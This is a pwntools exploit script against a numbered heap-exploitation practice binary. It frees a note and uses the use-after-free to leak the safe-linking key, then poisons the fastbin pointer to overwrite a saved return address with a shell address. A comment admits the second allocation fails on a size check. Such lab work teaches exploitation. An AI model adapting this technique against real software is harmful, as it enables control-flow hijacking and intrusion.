#!/usr/bin/python3
from pwn import *

p = process("./06-fastbin-uaf")
# p = gdb.debug("./06-fastbin-uaf")


def read_addr():
    line = p.recvline().strip().decode()
    print(line)
    return int(line.split(": ")[1], 0)


shell_addr = read_addr()
op_addr = read_addr()


def create_note():
    print(p.recvuntil(b"Choice: ").decode())
    p.send(b"1\n")


def read_note():
    print(p.recvuntil(b"Choice: ").decode())
    p.send(b"2\n")
    return p.recvline()[:-1]


def update_note(data):
    print(p.recvuntil(b"Choice: ").decode())
    p.send(b"3\n")
    p.sendline(data)


def delete_note():
    print(p.recvuntil(b"Choice: ").decode())
    p.send(b"4\n")


def exit_note():
    print(p.recvuntil(b"Choice: ").decode())
    p.send(b"0\n")


rip_addr = op_addr + 4 + 8
print(f"rip address: {rip_addr:#x}\n")
create_note()
delete_note()
data = read_note()
val = u64(data.ljust(8, b"\x00"))
key = val << 12
print(f"key: {key:#x}")

update_note(p64((rip_addr - 8 - 0x10) ^ val))
create_note()
# this will fail at with an error "malloc(): memory corruption (fast)"
#   because header size is checked when getting chunk from fastbin
create_note()
update_note(b"A" * 8 + p64(shell_addr))
exit_note()

print(p.recvline())
p.interactive()
